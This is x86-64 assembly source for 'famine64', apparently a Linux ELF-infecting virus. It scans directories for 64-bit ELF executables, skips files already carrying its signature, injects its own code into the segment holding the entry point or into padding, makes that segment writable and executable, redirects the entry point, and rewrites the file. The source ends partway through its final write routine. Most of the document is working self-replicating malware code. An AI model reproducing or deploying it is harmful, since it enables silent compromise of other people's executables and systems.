	[BITS 64]

	%define SYS_READ		0
	%define SYS_WRITE		1
	%define SYS_OPEN		2
	%define SYS_CLOSE		3
	%define SYS_STAT		4
	%define SYS_LSEEK		8
	%define SYS_MMAP		9
	%define SYS_MUNMAP		11
	%define SYS_GETDENTS64	217
	%define MAKE_EXECUTABLE_DEBUGGABLE
	global famine64_func:function
	global famine64_size:data
	global famine64_signature:data

	segment .text

famine64_func:
	famine64_signature dq 0x42CAFE4224EFAC24

	push	rax
	push	rdi
	sub		rsp, 0x10
	jmp famine64_end

	mov		QWORD[rsp], 0
dir_loop:
	mov		rax, QWORD [rsp]
	lea		rdi, [rel dir_all]
	mov		rdi, [rdi + rax * 8]
	cmp		rdi, 0
	je		famine64_end
	call	find_files
	add		QWORD [rsp], 0x1
	jmp		dir_loop

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                      void find_files(char *dir_path)                       ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
find_files:
	push	rax
	push	rbx
	push	rdx
	push	rdi
	push	rsi
	sub		rsp, 1040		; char *dirpath, int fd   , int ret   , char b[1024]
							; [rsp]        , [rsp + 8], [rsp + 12], [rsp + 16]

	xor		eax, eax
	mov		QWORD [rsp], rdi			; store *dirpath
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(dir_path, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0)                                         ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, 0
	mov		rsi, 0x90800
	mov		rdi, QWORD [rsp]
	mov		rax, SYS_OPEN
	syscall
	mov		DWORD [rsp + 8], eax		; store directory fd
	cmp		DWORD [rsp + 8], 0			; test if < 0
	jl		find_files_end
loop_file:
	xor		eax, eax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_getdents(fd, struct linux_dirent64 *dirp, count)             ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp + 8]
	lea		rsi, [rsp + 16]
	mov		rdx, 1024
	mov		rax, SYS_GETDENTS64
	syscall
	test	eax, eax					; test if <= 0
	jle		loop_end
	mov		DWORD [rsp + 12], eax		; store getdents64() return value:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Return a number of bytes between 0 and 1024 (i defined it)            ;;
	;; In C, we would cast those bytes in struct linux_dirent64 * (see doc.) ;;
	;; to retreive directory files name                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor		rax, rax
	xor		rbx, rbx			; RBX will be the offset of each struct dirent64
	jmp		check_file_type
next_file:
	;; Next struct linux_dirent64 *
	movsx	eax, WORD [rsp + 16 + rbx + 16] ; 16 is the offset of *dirp->d_reclen
	add		ebx, eax
	cmp		DWORD [rsp + 12], ebx
	jle		loop_file
check_file_type:
	;; Loop throught getdents64() buffer / struct linux_dirent64*
	cmp		BYTE [rsp + 16 + rbx + 18], 8	; 18 is the offset of *dirp->d_type
	jne		next_file						; Check if regular file
	mov		rdi, QWORD [rsp]
	lea		rsi, [rsp + 16 + rbx + 19]		; 19 is the offset of *dirp->d_name
	call	get_dat_elf
	jmp		next_file
loop_end:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( int fd )                                                   ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp + 8]
	mov		rax, SYS_CLOSE
	syscall
find_files_end:
	add		rsp, 1040
	pop		rsi
	pop		rdi
	pop		rdx
	pop		rbx
	pop		rax
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;                  void get_dat_elf(char *dir, char *file)                   ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
get_dat_elf:
	push	rax
	push	rcx
	push	rdx
	push	rdi
	push	rsi
	push	r8
	push	r9
	push	r10
	push	r11
	sub		rsp, 1024				; char path[1024]
									; [rsp]

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Concatenate directory path name with file name to open it.            ;;
	;; The string will be stored in [rsp]                                    ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	xor		ecx, ecx				; store int i = 0 to do path[i] = dir[i]
	movzx	edx, BYTE [rdi]
	test	dl, dl					; test directory end of string
	je		copy_file
copy_dir_bytes:
	mov		BYTE [rsp + rcx], dl
	inc		rcx
	movzx	edx, BYTE [rdi + rcx]
	test	dl, dl
	jne		copy_dir_bytes
copy_file:
	add		rsp, rcx
	xor		eax, eax				; store j = 0 to do path[i + j] = file[j]
	movzx	edx, BYTE [rsi]
	test	dl, dl
	je		open_file
copy_file_bytes:	
	mov		BYTE [rsp + rax], dl
	inc		rax
	movzx	edx, BYTE [rsi + rax]
	test	dl, dl
	jne		copy_file_bytes
open_file:
	mov		BYTE [rsp + rax], 0		; NULL byte the end of the string path
	sub		rsp, rcx				; Return to the start of the string path
	sub		rsp, 16					; int fd, size_t size, void *data
									; [rsp] , [rsp + 4]  , [rsp + 8]
	mov		DWORD [rsp], -1
	mov		QWORD [rsp + 4], -1
	mov		QWORD [rsp + 8], -1
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_open(file_path, O_RDONLY|O_NONBLOCK, 0)                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 0x0
	mov		esi, 0x800
	lea		rdi, [rsp + 16]
	mov		rax, SYS_OPEN
	syscall
	mov		DWORD [rsp], eax		; store FD in [rsp]
	cmp		rax, 0					; test if fd < 0
	jl		get_dat_elf_end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 1, LSEEK_END)                                      ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 2					; LSEEK_END
	mov		esi, 1
	mov		edi, eax
	mov		rax, SYS_LSEEK
	syscall
	mov		DWORD [rsp + 4], eax	; store SIZE in [rsp + 4]
	cmp		rax, 0					; test return value
	jle		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; void	*mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov eax, DWORD [rsp + 4]
	mov		r9d, 0					; 0
	mov		r8d, -1					; -1
	mov		r10d, 0x22				; MAP_PRIVATE | MAP_ANONYMOUS
	mov		edx, 0x3				; PROT_READ | PROT_WRITE
	mov		rsi, rax				; size
	mov		edi, 0					; NULL
	mov		rax, SYS_MMAP
	syscall
	mov		QWORD [rsp + 8], rax	; store ADDRESS in [RSP + 8]
	cmp		rax, -1					; test if == MAP_FAILED (-1)
	jle		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	sys_lseek(fd, 0, SEEK_SET)                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edx, 0
	mov		esi, 0
	mov		edi, DWORD [rsp]
	mov		rax, SYS_LSEEK
	syscall
	cmp		rax, 0
	jl		close_file
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int	read(fd, buf, 1024)                                              ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub		rsp, 1040					; int i,     int j, char buf[1024],    int ret
										; [rsp], [rsp + 4],      [rsp + 8], [rsp + 1032]
	mov		DWORD [rsp], 0				; i = 0
	mov		DWORD [rsp + 4], 0			; j = 0

read_loop:
	mov		eax, DWORD [rsp + 4]
	add		DWORD [rsp], eax			; i += j
	mov		rdx, 1024
	lea		rsi, [rsp + 8]				; char buf[1024]
	mov		edi, DWORD [rsp + 1040]		; file -> fd
	mov		rax, SYS_READ
	syscall
	mov		DWORD [rsp + 1032], eax		; ret = read(...)
	cmp		DWORD [rsp + 1032], 0
	jle		read_loop_end
	mov		DWORD [rsp + 4], 0			; j = 0
read_loop_copy:
	mov		eax, DWORD [rsp + 4]		; j
	cmp		eax, DWORD [rsp + 1032]		; j >= ret
	jge		read_loop
	mov		eax, DWORD [rsp + 4]		; j
	movzx	eax, BYTE [rsp + rax + 8]	; buf[j]

	mov		edx, DWORD [rsp]			; i
	add		edx, DWORD [rsp + 4]		; j
	add		rdx, QWORD [rsp + 1048]		; void *data + i + j
	mov		BYTE [rdx], al				; data[i + j] = buf[j]
	add		DWORD [rsp + 4], 0x1		; j += 1
	jmp		read_loop_copy
read_loop_end:
	add		rsp, 1040
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int close( fd )                                                       ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		edi, DWORD [rsp]			; int fd
	mov		rax, SYS_CLOSE
	syscall

	cmp		DWORD [rsp - 8], 0			; ret != 0
	jne		munmap_file
	mov		rsi, QWORD [rsp + 8]
	mov		edi, DWORD [rsp + 4]
	call	check_file
	cmp		rax, 1
	jne		munmap_file
	mov		rdx, QWORD [rsp + 8]		; void *data
	mov		esi, DWORD [rsp + 4]		; int size
	lea		rdi, [rsp + 16]				; char *path
	call	infect_file
close_file:
	mov		edi, DWORD [rsp]			; int fd
	mov		rax, SYS_CLOSE
	syscall

munmap_file:
	cmp		QWORD [rsp + 16], -1		; void *data
	je		get_dat_elf_end
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int munmap(data, size)                                                ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		esi, DWORD [rsp + 4]	; int size
	mov		rdi, QWORD [rsp + 8]	; void *data
	mov		rax, SYS_MUNMAP
	syscall
get_dat_elf_end:
	add		rsp, 1040
	pop		r11
	pop		r10
	pop		r9
	pop		r8
	pop		rsi
	pop		rdi
	pop		rdx
	pop		rcx
	pop		rax
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void check_file(int size, char *data)                         ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
check_file:
	xor		rax, rax
	;; Check header integrity
	cmp		rdi, 0x3f				; size < sizeof(Elf64_Ehdr)
	jl		check_end
	cmp		DWORD [rsi], 0x464c457f	; ->e_ident != 0x7fELF
	jne		check_end
	cmp		BYTE [rsi + 4], 2		; ->e_ident[EI_CLASS] != ELFCLASS64
	jne		check_end
	cmp		BYTE [rsi + 5], 0		; ->e_ident[EI_DATA] == ELFDATANONE
	je		check_end
	cmp		BYTE [rsi + 6], 1		; ->e_ident[EI_VERSION] != EV_CURRENT
	jne		check_end
	movzx	edx, WORD [rsi + 16]	; ->e_type != ET_EXEC && ->e_type != ET_DYN
	sub		edx, 2
	cmp		dl, 1
	ja		check_end
	cmp		WORD [rsi + 18], 0x3e	; ->e_machine != EM_X86_64
	jne		check_end
	;; Check offsets integrity
	cmp		QWORD [rsi + 32], 64	; ->e_phoff != sizeof(Elf64_Ehdr)
	jne		check_end
	movzx	edx, WORD [rsi + 56]	; ->e_phnum
	imul	edx, 56					; ->e_phnum * sizeof(Elf64_Phdr)
	add		rdx, QWORD [rsi + 32]	; ... + ->e_phoff
	cmp		rdx, rdi				; ... > size
	ja		check_end
	cmp		QWORD [rsi + 40], 64	; ->e_shoff < sizeof(Elf64_Ehdr)
	jl		check_end
	movzx	edx, WORD [rsi + 60]	; ->e_shnum
	imul	edx, 64					; ->e_shnum * sizeof(Elf64_Shdr)
	add		rdx, QWORD [rsi + 40]	; ... + ->e_shoff
	cmp		rdx, rdi				; ... > size
	ja		check_end
	cmp		WORD [rsi + 52], 64		; ->e_ehsize != sizeof(Elf64_Ehdr)
	jne		check_end
	cmp		WORD [rsi + 54], 56		; ->e_phentsize != sizeof(Elf64_Phdr)
	jne		check_end
	cmp		WORD [rsi + 58], 64		; ->e_shentsize != sizeof(Elf64_Shdr)
	jne		check_end
	movzx	edx, WORD [rsi + 60]	; ->e_shnum
	cmp		WORD [rsi + 62], dx		; ->e_shstrndx >= ->e_shnum
	jae		check_end
	mov		rax, 1
check_end:
	ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                                                                            ;;
;;              void infect_file(char *path, int size, char *data)            ;;
;;                                                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
infect_file:
	push	r15
	push	r14
	push	r13
	push	r12
	push	rbp
	push	rbx

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 1. Find the memory mapped PT_LOAD segment that contains entry point   ;;
	;;    R8 will store it.                                                  ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		r8, QWORD [rdx + 32]	; ->e_phoff (size: 8)
	lea		r8, [rdx + r8]			; Program Header table start
	xor		rcx, rcx
	movzx	ecx, WORD [rdx + 56]	; hdr->e_phnum
	xor		r9, r9
	movzx	r9d, WORD [rdx + 54]	; hdr->e_phentsize
	imul	rcx, r9
	add		rcx, r8					; Program Header table end
	mov		r10, QWORD [rdx + 24]	; hdr->e_entry
	;;    R8  : Program Header table start
	;;    RCX : Program Header table end
	;;    R10 : Entry Point
	;; The first segment of an ELF file is full of \0 so w can skip it...
	jmp		get_segment
next_segment:
	add		r8w, WORD [rdx + 54]	; move to next Program Header segment
	cmp		r8, rcx					; end of Program Header segment ?
	jge		infect_file_end_pop
get_segment:
	cmp		DWORD [r8], 1			; is it PT_LOAD segment ?
	jne		next_segment
	cmp		QWORD [r8 + 16], r10	; segment->p_vaddr > hdr->e_entry ?
	jg		next_segment
	mov		r9, QWORD [r8 + 16]		; segment->p_vaddr
	add		r9, QWORD [r8 + 32]		; ... + segment->p_filesz
	cmp		r9, r10					; ... < hdr->e_entry ?
	jl		next_segment
	cmp		r8, rcx					; Did we reached the end without founding
	jge		infect_file_end_pop		; the entry point segment ?

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 2. Check if the file is already infected                              ;;
	;;    Our code inject a signature at the very end of the file.           ;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RSI contains the file size
	;;    RDX contains *data
check_signature:	
	mov		r9, rdx					; *data
	add		r9, rsi					; *data + data size
	sub		r9, 9					; *data + data size - signature size - 1
	mov		r9, QWORD [r9]			; [data + data size - signature size - 1]
	cmp		r9, QWORD [rel famine64_signature]
	je		infect_file_end_pop

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;  . Setup the stack to store different values
	;;
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	sub		rsp, 188
	;; int fd, char *data, size_t size, size_t entry, size_t offset, void *segment, struct stat
	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
	mov		DWORD [rsp], 0x0			; clear [rsp] to store fd
	mov		QWORD [rsp + 4], rdx		; store the address of the file data
	mov		QWORD [rsp + 12], rsi		; store the file size
	mov		QWORD [rsp + 20], 0x0		; clear entry jump
	mov		QWORD [rsp + 28], 0x0		; clear offset
	mov		QWORD [rsp + 36], r8		; store infected segment addr
	mov		QWORD [rsp + 44], rdi		; store file path addr
	mov		QWORD [rsp + 52], 0x0		; clear struct stat

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 3.Get file permissions
	;;   int stat(char *path, struct stat *buf)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; RDI contains file_path addr
	lea		rsi, [rsp + 52]
	mov		rax, SYS_STAT
	syscall
	cmp		eax, 0
	jne		infect_file_end_add

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 5. Re-open the file
	;;    int open(char *pathname, int flags, mode_t mode)
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;    RSP contains the struct stat of the file
	;;    RDI contains file_path
	;;    RSI contains the struct stat address
	mov		esi, 65						; O_WRONLY | O_CREAT
	mov		rdx, QWORD [rsp + 52 + 24]	; stat.st_mode
	mov		rax, SYS_OPEN
	syscall
	cmp		eax, 0						; test if < 0
	jl		infect_file_end_add
	mov		DWORD [rsp], eax			; store file fd

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 6. Compute:
	;; - offset where we will write our code
	;; - jump value to launch the program first behavior
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;;
	mov		r8, QWORD [rsp + 36]		; segment addr
	mov		r9, QWORD [r8 + 8]			; segment->p_offset
	add		r9, QWORD [r8 + 32]			; + segment->p_filesz
	mov		QWORD [rsp + 28], r9		; -> offset

	mov		r8, QWORD [rsp + 36]		; segment addr
	mov		r9, QWORD [r8 + 16]			; segment->p_vaddr
	add		r9, QWORD [r8 + 32]			; + segment->p_filesz
	mov		r8, QWORD [rsp + 4]			; char *data
	sub		r9, QWORD [r8 + 24]			; data->e_entry
	imul		r9, -1
	mov		QWORD [rsp + 20], r9		; -> entry jump

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 7. Modify the Elf Header entry point
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		r8, QWORD [rsp + 4]			; char *data
	mov		r9, QWORD [rsp + 36]		; Elf64_Phdr *segment
	mov		r9, QWORD [r9 + 16]			; *segment->p_vaddr
	add		r9, QWORD [rsp + 28]		; + size_t offset
	mov		QWORD [r8 + 24], r9			; *data->e_entry = *segment->p_vaddr + offset

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 8. Check if we have room to store our code
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		r8, QWORD [rsp + 36]		; segment addr we infect
	mov		r9, QWORD [rsp + 4]			; *data
	xor		r10, r10
	mov		r10w, WORD [r9 + 54]		; *data->e_phentsize
	add		r10, r8						; next segment

	mov		r9, QWORD [r10 + 8]			; next segment->p_offset
	sub		r9, QWORD [r8 + 8]			; - isegment->p_offset
	sub		r9, QWORD [r8 + 40]			; - isegment->p_filesz
	cmp		r9d, DWORD [rel famine64_size]
	jg		infect_file_in_padding

	xor		rax, rax
compute_padding:
	add		eax, 4096
	cmp		eax, DWORD [rel famine64_size]
	jl		compute_padding
%ifdef MAKE_EXECUTABLE_DEBUGGABLE
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Modify segments' offset higher than the one we rewrite
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	mov		rdx, QWORD [rsp + 4]		; *data
	mov		r8, QWORD [rdx + 32]		; ->e_phoff (size: 8)
	lea		r8, [rdx + r8]				; Program Header table start
	xor		rcx, rcx
	movzx	ecx, WORD [rdx + 56]		; hdr->e_phnum
	xor		r9 , r9
	movzx	r9d, WORD [rdx + 54]		; hdr->e_phentsize
	imul	rcx, r9
	add		rcx, r8						; Program Header table end
	mov		r9, QWORD [rsp + 36]		; *segment
	mov		r10, QWORD [r9 + 8]			;   segment->p_offset
	add		r10, QWORD [r9 + 32]		; + segment->p_filesz
	;; The first segment of an ELF file is full of \0 so we can skip it...
next_segment2:
	add		r8w, WORD [rdx + 54]		; move to next Program Header segment
	cmp		rcx, r8						; end of Program Header segment ?
	jle		modify_sections
	cmp		QWORD [r8 + 8], r10		; seg->p_offset >= iseg->p_offset + iseg->p_filesz ?
	jl		next_segment2
	add		QWORD [r8 + 8], rax
	jmp		next_segment2

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Modify sections' offset higher than the one we rewrite
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
modify_sections:
	mov		r8, QWORD [rdx + 40]		; ->e_shoff (size: 8)
	lea		r8, [rdx + r8]				; Section Header table start
	xor		rcx, rcx
	movzx	ecx, WORD [rdx + 60]		; hdr->e_shnum
	xor		r9 , r9
	movzx	r9d, WORD [rdx + 58]		; hdr->e_shentsize
	imul	rcx, r9
	add		rcx, r8						; Program Header table end
	;; The first section of an ELF file is full of \0 so we can skip it...
next_section2:
	add		r8w, WORD [rdx + 58]		; move to next Section Header segment
	cmp		rcx, r8						; end of Program Header segment ?
	jle		modify_shoff
	cmp		QWORD [r8 + 24], r10		; sect->sh_offset >= iseg->p_offset + iseg->p_filesz ?
	jl		next_section2
	add		QWORD [r8 + 24], rax
	jmp		next_section2

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Modify section table offset
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
modify_shoff:
	mov		rcx, QWORD [rsp + 4]
	add		QWORD [rcx + 40], rax
%else
	add		QWORD [r10 + 8], rax
%endif
infect_file_add_padding:
	;; int fd, char *data, size_t size, size_t entry, size_t offset, void *segment, struct stat
	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
	mov		r8, QWORD [rsp + 36]
	add		QWORD [r8 + 32], rax		; *segment->p_filesz += padding
	add		QWORD [r8 + 40], rax		; *segment->p_memsz += padding
	xor		r9, r9
	or		r9, 1						; segment R permission
	or		r9, 2						; segment W permission
	or		r9, 4						; segment X permission
	mov		DWORD [r8 + 4], r9d			; *segment->p_flags

	mov		QWORD [rsp + 44], rax
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 10. Time to rewrite the excutable
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int fd, char *data, size_t size, size_t entry, size_t offset, void *segment, struct stat
	;;                                                                              size_t padding
	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	mov		rsi, QWORD [rsp + 4]
	mov		rdx, QWORD [rsp + 28]
	syscall

	mov		rax, SYS_WRITE
	mov		edi, DWORD[rsp]
	lea		rsi, [rel famine64_func]
	mov		edx, [rel famine64_size]
	sub		edx, 8
	syscall

	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	lea		rsi, [rsp + 20]
	mov		rdx, 8
	syscall

write_zeros:
	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	lea		rsi, [rel zero]
	mov		edx, 1
	syscall
	sub		QWORD [rsp + 44], 1
	mov		rax, QWORD [rsp + 44]
	cmp		eax, [rel famine64_size]
	jg		write_zeros
	jmp		write_end

infect_file_in_padding:
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 9. Modify the segment values we write in
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; R8 contains segment we infect
	xor		r9, r9
	mov		r9d, DWORD [rel famine64_size]
	add		QWORD [r8 + 32], r9			; segment->p_filesz += famine64_size
	add		QWORD [r8 + 40], r9			; segment->p_memsz += famine64_size
	xor		r9, r9
	or		r9, 1						; segment R permission
	or		r9, 2						; segment W permission
	or		r9, 4						; segment X permission
	mov		DWORD [r8 + 4], r9d			; segment->p_flags

	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; 10. Time to rewrite the excutable
	;; 
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; int fd, char *data, size_t size, size_t entry, size_t offset, void *segment, struct stat
	;; 4     , 8         , 8          , 8           , 8            , 8            , 144
	;; [rsp] , [rsp + 4] , [rsp + 12] , [rsp + 20]  , [rsp + 28]   , [rsp + 36]   , [rsp + 44]
	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	mov		rsi, QWORD [rsp + 4]
	mov		rdx, QWORD [rsp + 28]
	syscall

	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	lea		rsi, [rel famine64_func]
	mov		edx, DWORD [rel famine64_size]
	sub		edx, 8
	syscall

	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	lea		rsi, [rsp + 20]
	mov		rdx, 8
	syscall

	xor		rax, rax
	mov		eax, DWORD [rel famine64_size]
	add		QWORD [rsp + 28], rax

write_end:
	mov		rax, SYS_WRITE
	mov		edi, DWORD [rsp]
	mov		rsi, QWORD [rsp + 4]
	add		rsi, QWORD [rsp + 28]
	mov		rdx, QWORD [rsp + 12]
	sub		rdx, QWORD [rsp + 28]
	sub		edx, 1
